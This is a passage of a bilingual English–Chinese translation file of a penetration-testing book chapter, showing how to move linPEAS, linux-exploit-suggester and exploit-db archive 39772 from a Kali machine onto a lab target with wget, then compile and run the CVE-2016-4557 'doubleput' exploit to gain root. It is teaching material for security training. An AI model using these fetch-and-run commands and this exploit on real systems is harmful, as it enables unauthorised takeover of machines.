  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.11 – Linux 临时目录
- en: 'We can now use the **wget** utility to download the file from the Kali VM onto
    our target system. This can be done by running the following command on the target
    system:'
  id: totrans-109
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以使用 **wget** 工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成：
- en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
  id: totrans-110
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget http://<KALI-VM-IP>/linpeas.sh**'
- en: 'The output of the preceding command can be seen in the following screenshot:'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 上述命令的输出可以在以下截图中看到：
- en: '![Figure 10.12 – wget successful transfer'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.12 – wget 成功传输'
- en: '](Images/B17389_10_012.jpg)'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_012.jpg)'
- en: Figure 10.12 – wget successful transfer
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.12 – wget 成功传输
- en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
    file should be downloaded and saved with the name we specified.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所示的截图，如果传输成功，**linpeas.sh** 文件应该已被下载并以我们指定的名称保存。
- en: We can now use the **linpeas.sh** script to enumerate important system information
    that we can use to elevate our privileges.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以使用 **linpeas.sh** 脚本来枚举重要的系统信息，这些信息可以帮助我们提升权限。
- en: Enumerating system information
  id: totrans-117
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 枚举系统信息
- en: 'The **linpeas.sh** script enumerates a lot of information and will perform
    various checks to discover potential vulnerabilities on the target system. However,
    it does not enumerate a list of potential kernel exploits. In the context of kernel
    exploits, we can use the **linpeas.sh** script to enumerate system information
    such as the kernel version. This can be done by going through the following steps:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '**linpeas.sh** 脚本会列举大量信息，并执行各种检查以发现目标系统上的潜在漏洞。然而，它并不会列出潜在的内核漏洞。在内核漏洞的上下文中，我们可以使用
    **linpeas.sh** 脚本来枚举系统信息，例如内核版本。这可以通过以下步骤来完成：'
- en: 'To enumerate all the important system information, we need to run the **linpeas.sh**
    script. However, before we do that, we need to ensure the script has executable
    permissions. This can be done by running the following command on the target:'
  id: totrans-119
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要列举所有重要的系统信息，我们需要运行 **linpeas.sh** 脚本。然而，在此之前，我们需要确保该脚本具有可执行权限。可以通过在目标系统上运行以下命令来完成：
- en: '**chmod +x linpeas.sh**'
  id: totrans-120
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**chmod +x linpeas.sh**'
- en: 'We can now run the **linpeas.sh** script by running the following command on
    the target:'
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以通过在目标系统上运行以下命令来运行 **linpeas.sh** 脚本：
- en: '**./linpeas.sh -o SysI**'
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./linpeas.sh -o SysI**'
- en: The **SysI** option is used to restrict the results of the script to only system
    information. This is primarily because the **linpeas.sh** script will generate
    a lot of output.
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**SysI** 选项用于将脚本的结果限制为仅系统信息。这主要是因为 **linpeas.sh** 脚本会生成大量输出。'
- en: 'As shown in the following screenshot, the script will enumerate system information,
    the kernel version that''s been installed, and the Linux distribution release
    version, as well as the codename:'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，脚本会列举系统信息，包括已安装的内核版本、Linux 发行版版本以及代号：
- en: '![Figure 10.13 – linPEAS system information'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.13 – linPEAS 系统信息'
- en: '](Images/B17389_10_013.jpg)'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_013.jpg)'
- en: Figure 10.13 – linPEAS system information
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.13 – linPEAS 系统信息
- en: In this case, our target is running Ubuntu 16.04 LTS with kernel version 4.4.0-21
    running. We can use this information to identify specific vulnerabilities that
    affect this version of the kernel. The distribution ID, release version, and codename
    are also important as some kernel exploits are designed to be run on specific
    Linux distributions.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们的目标系统运行的是 Ubuntu 16.04 LTS，内核版本为 4.4.0-21。我们可以利用这些信息来识别影响此版本内核的特定漏洞。发行版
    ID、版本号和代号也非常重要，因为某些内核漏洞是专门为特定的 Linux 发行版设计的。
- en: The **linPEAS** script does not provide us with any potential kernel exploits
    that can be used to elevate our privileges. As a result, we will have to utilize
    other enumeration scripts.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: '**linPEAS** 脚本没有提供任何潜在的内核漏洞，可以用于提升我们的权限。因此，我们必须使用其他枚举脚本。'
- en: Note
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: The **linPEAS** script enumerates a lot of useful information that will be very
    useful in the later stages of this book as we delve into other Linux privilege
    escalation techniques.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: '**linPEAS** 脚本列举了许多有用的信息，这些信息将在本书的后续章节中非常有用，尤其是在我们深入探讨其他 Linux 提权技巧时。'
- en: Enumerating kernel exploits
  id: totrans-132
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 枚举内核漏洞
- en: We can utilize **linux-exploit-suggester** to enumerate our system information
    and scan for potential kernel exploits. The **linux-exploit-suggester** script
    can be downloaded from [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester).
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以使用**linux-exploit-suggester**来枚举我们的系统信息并扫描潜在的内核漏洞。**linux-exploit-suggester**脚本可以从[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)下载。
- en: 'It is recommended that you download the script and rename it with a simpler
    filename. This can be automated by running the following command:'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 建议下载脚本并将其重命名为更简单的文件名。可以通过运行以下命令来实现自动化：
- en: wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
    -O les.sh
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
    -O les.sh
- en: 'After downloading the script, we will need to transfer it over to the target
    system. This can be done by following these steps:'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 下载脚本后，我们需要将其传输到目标系统。可以按照以下步骤进行操作：
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **les.sh** script is stored:'
  id: totrans-137
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了在 Kali 虚拟机上搭建一个 Web 服务器，我们可以利用**SimpleHTTPServer** Python 模块来提供二进制文件。可以通过在存储**les.sh**脚本的目录中运行以下命令来完成此操作：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: To download the **les.sh** script on the target system, we can utilize the **wget**
    utility. Before we can download the binary, however, we need to navigate to a
    directory where we have read and write permissions. In this case, we will navigate
    to the temporary directory, as illustrated in the following screenshot:![Figure
    10.14 – Linux temp directory
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要在目标系统上下载**les.sh**脚本，我们可以使用**wget**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到临时目录，如以下截图所示：![图
    10.14 – Linux 临时目录
- en: '](Images/B17389_10_014.jpg)'
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_014.jpg)'
- en: Figure 10.14 – Linux temp directory
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.14 – Linux 临时目录
- en: 'We can now use the **wget** utility to download the file from the Kali VM to
    our target system. This can be done by running the following command on the target
    system:'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们可以使用**wget**工具将文件从 Kali 虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来完成此操作：
- en: '**wget http://<KALI-VM-IP>/les.sh**'
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget http://<KALI-VM-IP>/les.sh**'
- en: 'The output is shown in the following screenshot:'
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 输出显示在以下截图中：
- en: '![Figure 10.15 – wget successful transfer'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.15 – wget 成功传输'
- en: '](Images/B17389_10_015.jpg)'
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_015.jpg)'
- en: Figure 10.15 – wget successful transfer
  id: totrans-147
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.15 – wget 成功传输
- en: As shown in the preceding screenshot, if the transfer is successful, the **les.sh**
    script should be downloaded and saved with the name we specified.
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如上所示，如果传输成功，**les.sh**脚本应已下载并以我们指定的名称保存。
- en: 'We can now use the **les.sh** script to enumerate potential kernel vulnerabilities
    that we can use to elevate our privileges. This can be done by running the following
    command on the target system:'
  id: totrans-149
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以使用**les.sh**脚本来枚举我们可以利用来提升权限的潜在内核漏洞。可以通过在目标系统上运行以下命令来完成此操作：
- en: '**./les.sh**'
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./les.sh**'
- en: 'As outlined in the following screenshot, the script will enumerate all potential
    kernel exploits that can be used to elevate privileges. We can now use this information
    to determine the correct kernel exploit to use:'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，脚本将枚举所有可用于提升权限的潜在内核漏洞。我们现在可以利用这些信息来确定使用哪个内核漏洞：
- en: '![Figure 10.16 – Linux exploit suggester – kernel exploits'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.16 – Linux 漏洞建议器 – 内核漏洞'
- en: '](Images/B17389_10_016.jpg)'
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_016.jpg)'
- en: Figure 10.16 – Linux exploit suggester – kernel exploits
  id: totrans-154
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.16 – Linux 漏洞建议器 – 内核漏洞
- en: It is always recommended to use the first exploit's output with the enumeration
    tools and scripts. In this case, we will start with the CVE-2016-4557 kernel exploit.
    We will need to determine more information about the exploit and how it should
    be used. We can do this by performing a quick Google search, as highlighted in
    the following screenshot:![Figure 10.17 – CVE-2016-4557 Google search](Images/B17389_10_017.jpg)
  id: totrans-155
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 始终建议使用第一个漏洞的输出与枚举工具和脚本结合使用。在本例中，我们将从 CVE-2016-4557 内核漏洞开始。我们需要获取更多有关该漏洞的信息，并了解如何使用它。我们可以通过执行快速
    Google 搜索来完成这项任务，如以下截图所示：![图 10.17 – CVE-2016-4557 Google 搜索](Images/B17389_10_017.jpg)
- en: Figure 10.17 – CVE-2016-4557 Google search
  id: totrans-156
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.17 – CVE-2016-4557 Google 搜索
- en: The preceding Google search reveals an **exploit-db** reference that contains
    information regarding the exploit, the exploit's source code, and how it should
    be used.
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 先前的 Google 搜索揭示了一个 **exploit-db** 的引用，其中包含有关该漏洞的信息、漏洞的源代码以及如何使用它。
- en: It is always recommended to analyze the source code to ensure that it is not
    malicious and works as intended. This allows you to make any additional modifications
    that are required.
  id: totrans-158
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 始终建议分析源代码，以确保它不是恶意的，并且按预期工作。这使你能够进行任何必要的修改。
- en: 'Alternatively, we can also use the **exploit-db** command-line utility to query
    for specific vulnerabilities. This can be done by running the following command
    in the Kali VM:'
  id: totrans-159
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 或者，我们也可以使用 **exploit-db** 命令行工具来查询特定的漏洞。可以通过在 Kali 虚拟机上运行以下命令来完成：
- en: '**searchsploit linux kernel 4.4**'
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**searchsploit linux kernel 4.4**'
- en: 'In this case, we are querying the **exploit-db** database for exploits specific
    to Linux kernel version 4.4.0\. As highlighted in the following screenshot, we
    can identify the same exploit:'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在这种情况下，我们正在查询 **exploit-db** 数据库，寻找与 Linux 内核版本 4.4.0 相关的漏洞。如以下截图所示，我们可以识别相同的漏洞：
- en: '![Figure 10.18 – Searchsploit results'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.18 – Searchsploit 结果](Images/B17389_10_018.jpg)'
- en: '](Images/B17389_10_018.jpg)'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.18 – Searchsploit 结果](Images/B17389_10_018.jpg)'
- en: Figure 10.18 – Searchsploit results
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.18 – Searchsploit 结果
- en: Now that we have identified a potential kernel exploit, we can start transferring
    the exploit to the target and execute it.
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经确定了一个潜在的内核漏洞，我们可以开始将漏洞文件传输到目标并执行它。
- en: Running the kernel exploit
  id: totrans-166
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 运行内核漏洞利用
- en: 'Closer analysis of the kernel exploit reveals its functionality and any compilation
    instructions (if needed), as highlighted in the following screenshot:'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 对内核漏洞利用的进一步分析揭示了其功能和任何编译说明（如果需要），如以下截图所示：
- en: '![Figure 10.19 – Exploit instructions'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.19 – 漏洞利用说明](Images/B17389_10_019.jpg)'
- en: '](Images/B17389_10_019.jpg)'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.19 – 漏洞利用说明](Images/B17389_10_019.jpg)'
- en: Figure 10.19 – Exploit instructions
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.19 – 漏洞利用说明
- en: In this particular case, we need to download the ZIP file that contains the
    compilation script and the exploit binary to the target. After doing this, we
    will need to run the **doubleput** binary to elevate our session.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个特定的案例中，我们需要将包含编译脚本和漏洞二进制文件的 ZIP 文件下载到目标系统。完成此操作后，我们需要运行 **doubleput** 二进制文件来提升我们的会话。
- en: 'More information regarding this exploit can be found here: [https://www.exploit-db.com/exploits/39772](https://www.exploit-db.com/exploits/39772).'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 关于此漏洞的更多信息可以在这里找到：[https://www.exploit-db.com/exploits/39772](https://www.exploit-db.com/exploits/39772)。
- en: 'We can run the kernel exploit by following these steps:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过以下步骤运行内核漏洞利用：
- en: 'The first step in this process involves downloading the exploit archive to
    your Kali VM. This can be done by running the following command:'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是将漏洞文件下载到你的 Kali 虚拟机。可以通过运行以下命令来完成：
- en: '**wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip**'
  id: totrans-175
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip**'
- en: 'After downloading the exploit archive, we will need to transfer it to the target
    system. This can be done by starting a local web server on the Kali VM with the
    **SimpleHTTPServer** Python module:'
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载漏洞文件后，我们需要将其传输到目标系统。这可以通过在 Kali 虚拟机上启动本地 Web 服务器，并使用 **SimpleHTTPServer**
    Python 模块来完成：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: To download the binary onto the target system, we can utilize the **wget** utility.
    Before we can download the binary, however, we need to navigate to a directory
    where we have read and write permissions. In this case, we will navigate to the
    temporary directory, as we have done in earlier sections.
  id: totrans-178
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要将二进制文件下载到目标系统，我们可以使用 **wget** 工具。然而，在下载二进制文件之前，我们需要导航到一个有读写权限的目录。在这种情况下，我们将导航到临时目录，正如我们在前面章节中所做的那样。
- en: 'We can now use the **wget** utility to download the exploit archive from the
    Kali VM to our target system. This can be done by running the following command
    on the target system:'
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们可以使用 **wget** 工具将漏洞文件从 Kali 虚拟机下载到目标系统。这可以通过在目标系统上运行以下命令来完成：
- en: '**wget http://<KALI-VM-IP>/39772.zip**'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wget http://<KALI-VM-IP>/39772.zip**'
- en: 'After transferring the exploit archive to the target, we need to extract the
    archive. This can be done by running the following command:'
  id: totrans-181
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将漏洞文件传输到目标系统后，我们需要解压该文件。可以通过运行以下命令来完成：
- en: '**unzip 39772.zip**'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**unzip 39772.zip**'
- en: 'After extracting the exploit archive, you will have a directory named **39772**.
    Navigating into this directory reveals the following files:'
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 解压漏洞文件后，你将看到一个名为 **39772** 的目录。进入该目录后，可以看到以下文件：
- en: '![Figure 10.20 – Exploit archive contents'
  id: totrans-184
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.20 – 漏洞利用压缩包内容'
- en: '](Images/B17389_10_020.jpg)'
  id: totrans-185
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_020.jpg)'
- en: Figure 10.20 – Exploit archive contents
  id: totrans-186
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.20 – 漏洞利用压缩包内容
- en: 'Now, we need to extract the **exploit.tar** archive. This can be done by running
    the following command:'
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，我们需要提取 **exploit.tar** 压缩包。可以通过运行以下命令来完成：
- en: '**tar xf exploit.tar**'
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**tar xf exploit.tar**'
- en: 'After extracting the **exploit.tar** archive, you will be presented with a
    directory, as highlighted in the following screenshot:'
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在提取 **exploit.tar** 压缩包后，你将看到一个目录，如下图所示：
- en: '![Figure 10.21 – Exploit directory'
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.21 – 漏洞利用目录'
- en: '](Images/B17389_10_021.jpg)'
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_021.jpg)'
- en: Figure 10.21 – Exploit directory
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.21 – 漏洞利用目录
- en: Navigating to this directory reveals the compilation script that will generate
    the exploit binary when executed.
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 进入此目录后，会显示出一个编译脚本，执行后将生成漏洞利用二进制文件。
- en: 'We can run the exploit compilation script by running the following command:'
  id: totrans-194
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令来执行漏洞利用编译脚本：
- en: '**./compile.sh**'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./compile.sh**'
- en: 'The exploit script will generate an exploit binary named **doubleput**, as
    highlighted in the following screenshot:'
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 漏洞利用脚本将生成一个名为 **doubleput** 的漏洞利用二进制文件，如下图所示：
- en: '![Figure 10.22 – Exploit binary'
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.22 – 漏洞利用二进制文件'
- en: '](Images/B17389_10_022.jpg)'
  id: totrans-198
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_022.jpg)'
- en: Figure 10.22 – Exploit binary
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.22 – 漏洞利用二进制文件
- en: 'As per the exploit execution instructions, we can run the **doubleput** binary
    to obtain an elevated session. This can be done by running the following command:'
  id: totrans-200
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 根据漏洞执行指令，我们可以运行**doubleput**二进制文件来获取提升会话。可以通过运行以下命令来实现：
- en: '**./doubleput**'
  id: totrans-201
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**./doubleput**'
- en: 'If the exploit binary runs successfully, you should receive an elevated session
    with root privileges, as highlighted in the following screenshot:'
  id: totrans-202
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果漏洞利用二进制文件成功运行，你应该会收到一个带有 root 权限的提升会话，以下截图中已突出显示：
- en: '![Figure 10.23 – Successful manual kernel exploit'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.23 – 成功的手动内核漏洞利用'
- en: '](Images/B17389_10_023.jpg)'
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_10_023.jpg)'
- en: Figure 10.23 – Successful manual kernel exploit
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.23 – 成功的手动内核漏洞利用
- en: With that, we have been able to successfully elevate our privileges on the target
    Linux VM by leveraging vulnerabilities in the Linux kernel. Now, we can begin
    exploring other Linux privilege escalation vectors.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 通过利用 Linux 内核中的漏洞，我们已成功在目标 Linux 虚拟机上提升了权限。现在，我们可以开始探索其他 Linux 权限提升途径。
- en: Summary
  id: totrans-207
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we started by identifying and running kernel exploits automatically
    with the Metasploit framework. We then looked at how to identify and transfer
    kernel exploits manually. We ended this chapter by taking a look at how to execute
    kernel exploits on the target system successfully to elevate our privileges.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们首先通过 Metasploit 框架识别并自动运行了内核漏洞利用。接着，我们查看了如何手动识别和传输内核漏洞利用。最后，我们探讨了如何在目标系统上成功执行内核漏洞利用来提升我们的权限。
- en: Now that we have learned how to perform kernel exploitation on Linux systems,
    we can begin exploring other Linux privilege escalation vectors.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经学会了如何在 Linux 系统上进行内核漏洞利用，可以开始探索其他 Linux 权限提升途径。
- en: In the next chapter, we will explore the process of mining and searching for
    locally stored passwords on Linux and how this can lead to successful privilege
    escalation.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章，我们将探讨如何在 Linux 上挖掘和搜索本地存储的密码，以及这如何导致成功的权限提升。
